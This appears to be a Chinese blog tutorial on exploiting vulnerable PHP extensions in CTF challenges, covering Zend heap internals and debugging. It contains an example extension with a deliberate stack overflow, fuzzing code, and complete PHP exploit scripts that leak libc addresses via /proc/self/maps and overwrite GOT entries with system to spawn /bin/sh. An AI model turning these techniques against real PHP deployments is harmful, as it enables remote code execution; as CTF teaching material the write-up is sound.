---
title: php pwn
slug: php-pwn-zjjbnh
url: /post/php-pwn-zjjbnh.html
date: '2025-04-02 20:27:26+08:00'
lastmod: '2025-04-11 12:47:20+08:00'
toc: true
isCJKLanguage: true
---



# php pwn

国内比赛最近非常喜欢出php的pwn，php解释器本身没有太多的可利用点，出题一般把漏洞埋在php的拓展。掌握了php的调试、函数传参、堆内存管理以后这类题难度都不大。

‍

## 基础知识

### php环境配置

#### apt安装

安装php，并查看版本，

```shell
❯ sudo apt install php php-dev
❯ php -v
PHP 8.3.6 (cli) (built: Mar 19 2025 10:08:38) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.3.6, Copyright (c) Zend Technologies
    with Zend OPcache v8.3.6, Copyright (c), by Zend Technologies
```

#### 源码安装（推荐）

推荐使用源码安装，因为这样会有调试符号，便于本地调试（尤其是学习堆的时候）

```sh
$ git clone https://github.com/php/php-src.git \ 
    --branch=PHP-8.3.15
$ cd php-src
$ ./buildconf --force
$ ./configure \
    --enable-cli \
    --enable-debug
$ make && make test && make install
```

这样是由完整调试符号和源码的：

![image](http://127.0.0.1:49715/assets/image-20250410163258-yxu9qe1.png)​

### php配置文件

主要关注其中的`disable_functions`​、`disable_classes`​和`extension`​，前二者限制了可以用于编写php利用脚本的函数和类，后者一般是pwn选手需要关注的带有漏洞的拓展文件。

```ini
; This directive allows you to disable certain functions.
; It receives a comma-delimited list of function names.
; https://php.net/disable-functions
disable_functions = "zend_version","func_num_args" ...

; This directive allows you to disable certain classes.
; It receives a comma-delimited list of class names.
; https://php.net/disable-classes
disable_classes = "stdClass","InternalIterator" ...

;;;;;;;;;;;;;;;;;;;;;;
; Dynamic Extensions ;
;;;;;;;;;;;;;;;;;;;;;;
extension = vuln.so
```

### php拓展

#### 拓展开发

[下载对应版本的php源码](https://github.com/php/php-src/releases)，进入`ext`​目录，创建一个拓展

```shell
❯ php ./ext/ext_skel.php --ext easy_phppwn --onlyunix
Copying config scripts... done
Copying sources... done
Copying tests... done

Success. The extension is now ready to be compiled. To do so, use the
following steps:

cd /home/l1qu1d/pwn/chall/php_pwn/php_test/php-src-php-8.3.15/ext/easy_phppwn
phpize
./configure
make

Don't forget to run tests once the compilation is done:
make test

Thank you for using PHP!
```

在拓展名对应的目录具有如下结构：

```c
❯ tree ./easy_phppwn
./easy_phppwn
├── config.m4
├── easy_phppwn.c
├── easy_phppwn.stub.php
├── easy_phppwn_arginfo.h
├── php_easy_phppwn.h
└── tests
    ├── 001.phpt
    ├── 002.phpt
    └── 003.phpt

2 directories, 8 files
```

其中`easy_phppwn_arginfo.h`​头文件与拓展的参数信息有关，不需要手动修改，在`easy_phppwn.stub.php`​中修改对应的文件即可。默认生成的只有`test`​和`test2`​两个函数，加入`test3`​：

```php
<?php

/**
 * @generate-class-entries
 * @undocumentable
 */

function test1(): void {}

function test2(string $str = ""): string {}

function test3(string $name): string {}
```

随后自动构建`easy_phppwn_arginfo.h`​

```php
php ../../build/gen_stub.php --ext=easy_phppwn ./easy_phppwn.stub.php
```

添加函数功能

```c
PHP_FUNCTION(test3)
{
	char *arg = NULL;
	size_t arg_len, len;
	char buf[100];
	if (zend_parse_parameters(ZEND_NUM_ARGS(), "s", &arg, &arg_len) == FAILURE) {
		return;
	}
	memcpy(buf, arg, arg_len);
	php_printf("The baby phppwn.\n");
	return SUCCESS;
}
```

编译，`configure`​生成的`Makefile`​需要删去`-O2`​优化，否则会加上`FORTIFY`​保护，导致`memcpy`​函数加上长度检查变为`__memcpy_chk`​函数：

```shell
❯ phpize
Configuring for:
PHP Api Version:         20230831
Zend Module Api No:      20230831
Zend Extension Api No:   420230831
configure.ac:165: warning: The macro `AC_PROG_LIBTOOL' is obsolete.
configure.ac:165: You should run autoupdate.
build/libtool.m4:100: AC_PROG_LIBTOOL is expanded from...
configure.ac:165: the top level
❯ ./configure --with-php-config=/usr/bin/php-config
...
❯ make
```

在`modules`​目录下会生成编译好的拓展文件`easy_phppwn.so`​。

#### 导入拓展

默认的拓展路径通过命令查看：

```shell
php -i | grep -i extension_dir
```

拓展在Linux下是一个动态链接库，通常在`php.ini`​中导入，并将so文件移动到上步输出的拓展路径下：

```ini
extension = numberGame.so
```

或者直接通过命令运行，而无需导入：

```shell
php -d extension=./modules/easy_phppwn.so test.php
```

#### 调试php拓展

自己写了个gdb python脚本[phpdbg](https://github.com/GeekCmore/phpdbg)，用于php调试，功能会逐步完善。

首先编写一个php代码：

```shell
<?php
test1();
?>
```

运行说明成功

```shell
❯ php -d extension=./modules/easy_phppwn.so test.php
The extension easy_phppwn is loaded and working!
```

gdb进行调试

```shell
gdb --args php -d extension=./modules/easy_phppwn.so test.php
```

根据php启动过程，在`php_module_startup()`​函数中加载拓展：

```gdb
start
b php_module_startup
c
fini
b zif_test1
```

因此下断点跑完这个函数就能看到模块被加载进来：

![image](http://127.0.0.1:49715/assets/image-20250403100903-1qg13pr.png)​

此时可以接着下断点到`zif_test1`​，这里需要注意php编译之后的是函数名会加上`zif_`​前缀

![image](http://127.0.0.1:49715/assets/image-20250403101006-vm19q4l.png)​

​`test3`​中可以看到栈溢出：

![image](http://127.0.0.1:49715/assets/image-20250403101540-ygv81ts.png)​

这里就不再赘述这个案例的利用方式了，结合后续题目进行介绍。

​​

### 函数传参

#### 传参约定

反编译的代码来看基本上除了参数处理以外就是原生的C代码，可读性比较强。

![image](http://127.0.0.1:49715/assets/image-20250403102807-6mf5xf8.png)​

但是从题目来看，一般都是直接给的二进制文件，所以需要具体了解`zend_parse_parameters`​的传参规则，这里的讲解不会涉及[底层细节](https://www.bookstack.cn/read/php7-internal/7-func.md#7.6.2%20%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90)：

```shell
zend_parse_parameters(int num_args, const char *type_spec, ...);
```

* ​`num_args`​为参数个数。
* ​`type_spec`​通过字符串表示参数的类型。
* 省略号表示具体接受参数的指针

对于参数类型而言，常用参数对照表：

|类型规范符|对应的C语言类型|说明|
| ------------| -----------------| -----------------------------------------------|
|​`b`​或`i`​|int|整数类型，`b`​通常表示bool类型，而`i`​表示int类型|
|​`l`​|long|长整型|
|​`d`​|double|浮点数类型|
|​`s`​|char\*|字符串，表示C语言中的字符指针|
|​`S`​|zend\_string|PHP 7中的 zend\_string 类型字符串|
|​`a`​|zval\*|PHP数组类型|
|​`o`​|zval\*|PHP对象类型|
|​`r`​|zval\*|PHP资源类型|
|​`z`​|zval\*|PHP变量（可以是任何类型）|
|​`N`​|无|表示参数为NULL|

字符串类型解析：

在PHP 7中，字符串解析有两种形式：char\*和zend\_string。其中：

* ​`"s"`​将参数解析到char\*，并且需要额外提供一个size\_t类型的变量用于获取字符串长度
* ​`"S"`​将解析到zend\_string，这是PHP 7中推荐使用的字符串类型[[0](https://www.kancloud.cn/nickbai/php7/363323)]

复合类型规范：

在实际使用中，可以将多个类型规范符组合使用，以表示多个参数的类型。例如：

* ​`"la"`​表示第一个参数为长整型，第二个参数为数组类型
* ​`"z|l"`​表示要接受一个zval类型的参数和一个可选的long类型的参数[[20](https://www.laruence.com/2020/02/27/5213.html)]

可选参数：

在类型规范字符串中，可以使用`|`​符号来表示后续的参数是可选的。例如：

* ​`"z|l"`​表示第一个参数是必需的zval类型，第二个参数是可选的long类型[[20](https://www.laruence.com/2020/02/27/5213.html)]

#### 传参结构体

但是很多时候都是直接用`z`​来代替参数，在后面通常会有一个形如`v15[8] == 6`​的比较操作，这实际上是在确定参数的类型：

![image](http://127.0.0.1:49715/assets/image-20250404155145-85om4a0.png)​

具体对应关系是：

```c
#define IS_UNDEF     0 /* A variable that was never written to. */
#define IS_NULL      1
#define IS_FALSE     2
#define IS_TRUE      3
#define IS_LONG      4 /* An integer value. */
#define IS_DOUBLE    5 /* A floating point value. */
#define IS_STRING    6
#define IS_ARRAY     7
#define IS_OBJECT    8
#define IS_RESOURCE  9
#define IS_REFERENCE 10
```

#### 参考

https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst

### php堆内存管理

虽说是php的内存管理，但是实际上是其内部zend引擎的内存管理机制。PHP采取“预分配方案”，提前向操作系统申请一个chunk（2M，利用到hugepage特性），并且将这2M内存切割为不同规格（大小）的若干内存块，当程序申请内存时，直接查找现有的空闲内存块即可；

PHP将内存分配请求分为3种情况：

huge内存：针对大于2M-4K的分配请求，直接调用mmap分配；

[large内存](https://www.imooc.com/article/51124)：针对小于2M-4K，大于3K的分配请求，在chunk上查找满足条件的若干个连续page；

small内存：针对小于3K的分配请求；PHP拿出若干个页切割为8字节大小的内存块，拿出若干个页切割为16字节大小的内存块，24字节，32字节等等，将其组织成若干个空闲链表；每当有分配请求时，只在对应的空闲链表获取一个内存块即可；

#### 相关结构体

element

在large和small两类chunk的第一个page里，会存储chunk的控制信息，这个结构体是`_zend_mm_chunk`​，所有的chunk会形成一个双向链表，`zend_mm_page_map`​利用位图记录512个page的使用情况，0代表空闲，1代表已经分配。`zend_mm_page_info`​通过`uint32_t`​存储FLAG信息，

```c
struct _zend_mm_chunk {
	zend_mm_heap      *heap;
	zend_mm_chunk     *next;
	zend_mm_chunk     *prev;
	uint32_t           free_pages;				/* number of free pages */
	uint32_t           free_tail;               /* number of free pages at the end of chunk */
	uint32_t           num;
	char               reserve[64 - (sizeof(void*) * 3 + sizeof(uint32_t) * 3)];
	zend_mm_heap       heap_slot;               /* used only in main chunk */
	zend_mm_page_map   free_map;                /* 512 bits or 64 bytes */
	zend_mm_page_info  map[ZEND_MM_PAGES];      /* 2 KB = 512 * 4 */
};

```

然后是[`\_zend\_mm\_heap`](https://github.com/php/php-src/blob/787f26c8827baa4fa6ed554fa4562750cc86d1a6/Zend/zend_alloc.c#L266)​，是chunk的上级管理结构，存储与堆分配相关的全局信息：

```c
struct _zend_mm_heap {
#if ZEND_MM_CUSTOM
	int                use_custom_heap;
#endif
#if ZEND_MM_STORAGE
	zend_mm_storage   *storage;
#endif
#if ZEND_MM_STAT
	size_t             size;                    /* current memory usage */
	size_t             peak;                    /* peak memory usage */
#endif
	uintptr_t          shadow_key;              /* free slot shadow ptr xor key */
	zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */
#if ZEND_MM_STAT || ZEND_MM_LIMIT
	size_t             real_size;               /* current size of allocated pages */
#endif
#if ZEND_MM_STAT
	size_t             real_peak;               /* peak size of allocated pages */
#endif
#if ZEND_MM_LIMIT
	size_t             limit;                   /* memory limit */
	int                overflow;                /* memory overflow flag */
#endif

	zend_mm_huge_list *huge_list;               /* list of huge allocated blocks */

	zend_mm_chunk     *main_chunk;
	zend_mm_chunk     *cached_chunks;			/* list of unused chunks */
	int                chunks_count;			/* number of allocated chunks */
	int                peak_chunks_count;		/* peak number of allocated chunks for current request */
	int                cached_chunks_count;		/* number of cached chunks */
	double             avg_chunks_count;		/* average number of chunks allocated per request */
	int                last_chunks_delete_boundary; /* number of chunks after last deletion */
	int                last_chunks_delete_count;    /* number of deletion over the last boundary */
#if ZEND_MM_CUSTOM
	struct {
		void      *(*_malloc)(size_t ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
		void       (*_free)(void*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
		void      *(*_realloc)(void*, size_t  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
		size_t     (*_gc)(void);
		void       (*_shutdown)(bool full, bool silent);
	} custom_heap;
	union {
		HashTable *tracked_allocs;
		struct {
			bool    poison_alloc;
			uint8_t poison_alloc_value;
			bool    poison_free;
			uint8_t poison_free_value;
			uint8_t padding;
			bool    check_freelists_on_shutdown;
		} debug;
	};
#endif
	pid_t pid;
	zend_random_bytes_insecure_state rand_state;
};
```

如果不方便看的话可以直接看gdb的结果：

![image](http://127.0.0.1:49715/assets/image-20250410164120-plfurqi.png)​

堆的最上层结构体是封装了`zend_mm_heap`​的`zend_alloc_globals`​：

```c
typedef struct _zend_alloc_globals {
	zend_mm_heap *mm_heap;
} zend_alloc_globals;
```

​`alloc_globals`​是类似于glibc中`main_arena`​的变量，通过它即可逐步获取整个堆：

```c
static zend_alloc_globals alloc_globals;
```

‍

#### small内存

这里只介绍small类型的内存分配，而这也是与我们攻击直接相关的部分。简单来说，small类型内存的空闲链表类似于2.27下的tcache空闲链表，也是单链表形式，并且没有任何保护，因此只需要修改链表中任一节点，即可劫持free的空闲链表。它的结构类似于：

![image](http://127.0.0.1:49715/assets/image-20250410205551-23m98m6.png)​

#### 源码分析

下面从源码来分析一下，当申请small类型heap时：

```c
static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
#if ZEND_MM_STAT
    do {
        size_t size = heap->size + bin_data_size[bin_num];
        size_t peak = MAX(heap->peak, size);
        heap->size = size;
        heap->peak = peak;
    } while (0);
#endif

    if (EXPECTED(heap->free_slot[bin_num] != NULL)) {
        zend_mm_free_slot *p = heap->free_slot[bin_num];
        heap->free_slot[bin_num] = p->next_free_slot;
        return p;
    } else {
        return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
    }
}
```

如果`free_slot`​资源不够，则会调用`zend_mm_alloc_small_slow`​创建一个对应大小的`free_slot`​：

```c
static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
	zend_mm_chunk *chunk;
	int page_num;
	zend_mm_bin *bin;
	zend_mm_free_slot *p, *end;

#if ZEND_DEBUG
	bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num], bin_data_size[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#else
	bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
#endif
	if (UNEXPECTED(bin == NULL)) {
		/* insufficient memory */
		return NULL;
	}

	chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);
	page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;
	chunk->map[page_num] = ZEND_MM_SRUN(bin_num);
	if (bin_pages[bin_num] > 1) {
		uint32_t i = 1;

		do {
			chunk->map[page_num+i] = ZEND_MM_NRUN(bin_num, i);
			i++;
		} while (i < bin_pages[bin_num]);
	}

	/* create a linked list of elements from 1 to last */
	end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));
	heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
	do {
		zend_mm_set_next_free_slot(heap, bin_num, p, (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]));
#if ZEND_DEBUG
		do {
			zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
			dbg->size = 0;
		} while (0);
#endif
		p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
	} while (p != end);

	/* terminate list using NULL */
	p->next_free_slot = NULL;
#if ZEND_DEBUG
		do {
			zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
			dbg->size = 0;
		} while (0);
#endif

	/* return first element */
	return bin;
}

```

释放时，直接将free的small heap链入末尾：

```c
static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num)
{
	ZEND_ASSERT(bin_data_size[bin_num] >= ZEND_MM_MIN_USEABLE_BIN_SIZE);

	zend_mm_free_slot *p;

#if ZEND_MM_STAT
	heap->size -= bin_data_size[bin_num];
#endif

#if ZEND_DEBUG
	do {
		zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
		dbg->size = 0;
	} while (0);
#endif

	p = (zend_mm_free_slot*)ptr;
	zend_mm_set_next_free_slot(heap, bin_num, p, heap->free_slot[bin_num]);
	heap->free_slot[bin_num] = p;
}
```

#### php堆调试

网上没有搜到比较合适的，自己写了个[phpgdb](https://github.com/GeekCmore/phpgdb)，目前支持4个命令。

##### pstart

运行到php加载完所有拓展之后，此时可以设置断点。

```sh
gdb> pstart
...
gdb> b zif_some_mod_func
```

##### pheap

查看最上层的堆信息：![image](http://127.0.0.1:49715/assets/image-20250411155511-6r48jx2.png)​

##### psmall

查看small slot链表：

![image](http://127.0.0.1:49715/assets/image-20250411155547-krvuky3.png)​

##### pelement

查看给定地址所属于的element（最终分配的堆块）

![image](http://127.0.0.1:49715/assets/image-20250411155656-or0ipg7.png)​

#### 参考链接

https://deepunk.icu/php-pwn/

https://www.imooc.com/article/51124

### 利用链

#### 泄露地址

php类题型一般能够通过`include`​包含文件，因此可以直接从`/proc/self/maps`​中读出地址（其实`vmmap`​命令就是在读这个文件）：

```php
function leakaddr($buffer){
    global $libc, $mbase;
    $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';
    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/numberGame.so/';
    preg_match_all($p, $buffer, $libc);
    preg_match_all($p1, $buffer, $mbase);
    return "";
}



ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);
```

#### 劫持执行流

一般而言，php拓展编译成动态链接库，默认编译选项下其got表是可写的，因此通常可以利用任意写劫持got表来劫持执行流。

#### getshell

一般php pwn都会在远程服务器运行一个php代码，很可能不能通过nc拿到交互的shell，因此通常执行反弹shell或者sendfile等。

## 例题分析

### 栈溢出：mixture

php pwn部分就是泄露地址+溢出ret2libc，可以作为入门题目。

题目来源：De1CTF 2020

参考：https://a1ex.online/2021/03/19/webpwn%E5%AD%A6%E4%B9%A0/

### 数组越界：numbergame

题目来源：第一届“长城杯”信息安全铁人三项赛决 夺取闯关 pwn numbergame

分析给的`numberGame.so`​文件，发现是一个类似堆题的增删改查功能，其中`zif_show_chunk`​调用了一个自定义的`_quicksort`​，漏洞点在这个位置：

![image](http://127.0.0.1:49715/assets/image-20250404124542-2q4uoq5.png)​

但是要去具体分析`_quicksort`​的代码来找到漏洞形成原因会比较困难，这里使用LLM生成fuzz代码来把这个漏洞测出来：

![image](http://127.0.0.1:49715/assets/image-20250404130916-s65ec0i.png)​

这是deepseek r1自动生成的代码，根据ida的代码可以进行细微的调整：

```py
import random
import subprocess
import os
from pathlib import Path

# 创建保存错误用例的目录
error_dir = Path("errors")
error_dir.mkdir(exist_ok=True)

functions = ['add_chunk', 'show_chunk', 'edit_chunk', 'edit_name']

def generate_number():
    """生成随机整数（十进制或十六进制）"""
    if random.choice([True, False]):
        return str(random.randint(-0x80000000, 0x7FFFFFFF))
    else:
        return hex(random.getrandbits(32))

def generate_string():
    """生成随机PHP字符串"""
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
    return f'"{random.choices(chars, k=random.randint(5, 15))[0]}"'

def generate_php_code():
    """生成随机PHP测试用例"""
    code = ["<?php\n"]
    
    # 生成5-15个函数调用
    for _ in range(random.randint(5, 15)):
        func = random.choice(functions)
        
        # 公共参数
        chunk_id = random.randint(-10, 20)  # 包含可能无效的ID
        
        if func == 'add_chunk':
            numbers = [generate_number() for _ in range(5)]  # 固定5个元素
            name = generate_string()
            code.append(f"add_chunk({chunk_id}, [{', '.join(numbers)}], {name});\n")
            
        elif func == 'show_chunk':
            code.append(f"show_chunk({chunk_id});\n")
            
        elif func == 'edit_chunk':
            index = random.randint(-5, 10)  # 可能越界的索引
            value = generate_number()
            code.append(f"edit_chunk({chunk_id}, {index}, {value});\n")
            
        elif func == 'edit_name':
            new_name = generate_string()
            code.append(f"edit_name({chunk_id}, {new_name});\n")
    
    return "".join(code)

def fuzz():
    """执行模糊测试"""
    test_count = 0
    while True:
        test_count += 1
        php_code = generate_php_code()
        
        # 写入测试文件
        with open("fuzz.php", "w") as f:
            f.write(php_code)
        
        # 执行测试
        result = subprocess.run(
            ["php", "-d", "extension=./numberGame.so", "fuzz.php"],
            capture_output=True,
            text=True
        )
        
        # 检查是否出错
        if result.returncode != 0:
            error_count = len(list(error_dir.glob("error_*.php"))) + 1
            with open(error_dir / f"error_{error_count}.php", "w") as f:
                f.write(f"// Return code: {result.returncode}\n")
                f.write(f"// Stderr: {result.stderr}\n")
                f.write(php_code)
            print(f"发现错误用例已保存：error_{error_count}.php")

if __name__ == "__main__":
    print("启动模糊测试...")
    try:
        fuzz()
    except KeyboardInterrupt:
        print("\n终止测试")

```

拿到代码不需要改，直接跑，几秒钟找到十几个error输入：

![image](http://127.0.0.1:49715/assets/image-20250404131348-f9nus2w.png)​

这个测试了一下，主要报错都是由于`edit(16....)`​导致的，这个属于是没什么用的洞。在fuzz里把这个问题修一下，顺便改一改参数：

```py
def generate_php_code():
    """生成随机PHP测试用例"""
    code = ["<?php\n"]
    
    # 生成5-15个函数调用
    for _ in range(random.randint(5, 15)):
        func = random.choice(functions)
        
        # 公共参数
        chunk_id = random.randint(0, 15)  # 包含可能无效的ID
        
        if func == 'add_chunk':
            numbers = [generate_number() for _ in range(random.randint(1, 15))]  # 固定5个元素
            name = generate_string()
            code.append(f"add_chunk({chunk_id}, [{', '.join(numbers)}], {name});\n")
            
        elif func == 'show_chunk':
            code.append(f"show_chunk({chunk_id});\n")
            
        elif func == 'edit_chunk':
            index = random.randint(0, 15)  # 可能越界的索引
            value = generate_number()
            code.append(f"edit_chunk({chunk_id}, {index}, {value});\n")
            
        elif func == 'edit_name':
            new_name = generate_string()
            code.append(f"edit_name({chunk_id}, {new_name});\n")
    
    return "".join(code)
```

这样跑起来几分钟就可以测出段错误：

```php
// Return code: -11
// Stderr: 
<?php
add_chunk(14, [0x5ac569df, 0x6c313c17, 591877129, 0x1fe65652, -944419699, -841403074, 154814687, 0xe98c4764, -864569255, 0xb719576e, 0xa73bb273, 0xd8f3896e, -902885394, 0x30dfbfa0], "U");
edit_name(10, "C");
edit_name(11, "4");
edit_chunk(13, 5, -1358782844);
edit_chunk(2, 11, 704899367);
show_chunk(6);
show_chunk(0);
show_chunk(5);
add_chunk(3, [0xaad0a2ba, -1645749333, 0x6fcf2a, 0x588abdfe, 0xb6b4a49f, 1414422535, -120011198], "z");

```

跑起来验证一下也就是`_quicksort`​排序的时候越界的问题，把size修改得任意大了，甚至name字段也被覆盖了：

![image](http://127.0.0.1:49715/assets/image-20250404132547-n39gf22.png)​

这个时候可以手工删减poc，以确定触发漏洞的输入：

```php
<?php
add_chunk(14, [0x5ac569df, 0x6c313c17, 591877129, 0x1fe65652, -944419699, -841403074, 154814687, 0xe98c4764, -864569255, 0xb719576e, 0xa73bb273, 0xd8f3896e, -902885394, 0x30dfbfa0], "U");
show_chunk(0);
```

这样就可以确定是排序导致的问题了，这个时候可以进一步针对这个数组序列构造fuzz：

```php
def generate_number():
    """生成随机整数（十进制或十六进制）"""
    return hex(random.getrandbits(32))

def generate_string():
    """生成随机PHP字符串"""
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
    return f'"{random.choices(chars, k=random.randint(5, 15))[0]}"'

def generate_php_code():
    """生成随机PHP测试用例"""
    code = ["<?php\n"]
    size = random.randint(1, 5)
    numbers = [generate_number() for _ in range(size)]  # 固定5个元素
    name = generate_string()
    code.append(f"add_chunk({size}, [{', '.join(numbers)}], {name});\n")
    code.append(f"show_chunk({0});\n")
```

这样跑起来就得到了很简单的poc：

```php
// Return code: -11
// Stderr: 
<?php
add_chunk(4, [0xcb949c35, 0x177c5522, 0xfec7b323, 0x726bb3bc], "i");
show_chunk(0);
```

会把size改大：

![image](http://127.0.0.1:49715/assets/image-20250404133728-irm7iaq.png)​

这样可以得到一个在php堆上的下溢任意地址写：

![image](http://127.0.0.1:49715/assets/image-20250404134112-cxyx8u9.png)​

思路也比较简单，就是第一次利用越界写修改下一个chunk的`name`​指针，再利用这个`name`​指针实现任意地址写。这里给出直接打本地的脚本，远程同理：

```php
<?php

$game_base = 0;
$libc_base = 0;
$libc = "";
$mbase = "";

function u64($leak){
    $leak = strrev($leak);
    $leak = bin2hex($leak);
    $leak = hexdec($leak);
    return $leak;
}

function p64($addr){
    $addr = dechex($addr);
    $addr = hex2bin($addr);
    $addr = strrev($addr);
    $addr = str_pad($addr, 8, "\x00");
    return $addr;
}

function leakaddr($buffer){
    global $libc, $mbase;
    $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';
    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .* \/home\/l1qu1d\/pwn\/chall\/php_pwn\/numberGame\/numberGame.so/';
    preg_match_all($p, $buffer, $libc);
    preg_match_all($p1, $buffer, $mbase);
    return "";
}

ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);
$libc_base = hexdec($libc[1][0]);
$game_base = hexdec($mbase[1][0]);
echo "Libc base => " . dechex($libc_base) . "\n";
echo "game base => " . dechex($libc_base) . "\n";


$offset = ($game_base + 0x4008) & 0xffffffff;
$system = $libc_base + 0x58750;
echo "offset => " . dechex($offset) . "\n";
echo "system => " . dechex($system) . "\n";


add_chunk(5, [0, 0, 0, 0x80000000, 0], "GeekCmore");
add_chunk(5, [0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef], "GeekCmore");
add_chunk(1, [0], "/bin/sh");
show_chunk(0);
edit_chunk(0, 18, $offset);

edit_name(1, substr(p64($system), 0, 6));
edit_name(2, "1")
?>
```

### 堆off by null：PwnShell

题目还是一个典型的堆菜单，分析结构体有点抽象，感觉是为了埋洞之后方便利用搞的：

![image](http://127.0.0.1:49715/assets/image-20250404164958-au287x1.png)​

漏洞点是`addHakcer`​的时候存在一个off by null的漏洞：

![image](http://127.0.0.1:49715/assets/image-20250404165024-3sweb6p.png)​

按照如下布局：

```php
<?php

addHacker("aaaaaaaa", "bbbbbbb");
addHacker("cccccccc", "ddddddd");
removeHacker(1);
addHacker("gggggggg", "hhhhhhh");
removeHacker(0);
addHacker("eeeeeeee", "ffffffff");

displayHacker(0);

?>

```

即可覆盖`chunkList[1].ptr->str1_ptr`​：

![image](http://127.0.0.1:49715/assets/image-20250404165217-nr557ub.png)​

结合`editHacker`​的修改能力：

```php
<?php

addHacker("aaaaaaaa", "bbbbbbb");
addHacker("cccccccc", "ddddddd");
removeHacker(1);
addHacker("gggggggg", "hhhhhhh");
removeHacker(0);
addHacker("eeeeeeee", "ffffffff");

editHacker(1, "hacked!!");
displayHacker(0);

?>
```

能在堆上进行一定的篡改：

![image](http://127.0.0.1:49715/assets/image-20250404165741-tz02367.png)​

通过适当构造可以得到任意地址写：

![image](http://127.0.0.1:49715/assets/image-20250411172907-0bq68ih.png)​

exp：

```php
<?php

$vuln_base = 0;
$libc_base = 0;
$libc = "";
$mbase = "";

function u64($leak){
    $leak = strrev($leak);
    $leak = bin2hex($leak);
    $leak = hexdec($leak);
    return $leak;
}

function p64($addr){
    $addr = dechex($addr);
    $addr = hex2bin($addr);
    $addr = strrev($addr);
    $addr = str_pad($addr, 8, "\x00");
    return $addr;
}

function leakaddr($buffer){
    global $libc, $mbase;
    $p = '/([0-9a-f].)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';
    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .* \/home\/l1qu1d\/pwn\/chall\/php_pwn\/pwnshelldock\/stuff\/vuln.so/';
    preg_match_all($p, $buffer, $libc);
    preg_match_all($p1, $buffer, $mbase);
    return "";
}

ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);
$vuln_base = hexdec($mbase[1][0]);
$libc_base = $vuln_base + 0x31a3000;
$strlen_got = $vuln_base + 0x4020;
$system_addr = $libc_base + 0x58750;
echo "Libc base   => " . dechex($libc_base) . "\n";
echo "game base   => " . dechex($vuln_base) . "\n";
echo "strlen got  => " . dechex($strlen_got) . "\n";
echo "system addr => " . dechex($system_addr) . "\n";


addHacker("aaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbb");
addHacker("cccccccccccccccccccccccc", "ddddddd");
addHacker("cccccccccccccccccccccccc", "ddddddd");
addHacker("/bin/sh", "/bin/sh");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");
addHacker("cccccccc", "ddddddd");

removeHacker(13);
addHacker("aaaaaaaaaaaaaaaaaaaaaaaa", "hhhhhhh");
removeHacker(12);
addHacker("aaaaaaaaaaaaaaaaaaaaaaaa", "ffffffff");
editHacker(13, p64(0x18) . "hhhhhhhh" . p64($strlen_got));
editHacker(14, p64($system_addr));
displayHacker(3);

?>

```

题目来源：D3CTF 2024 PwnShell

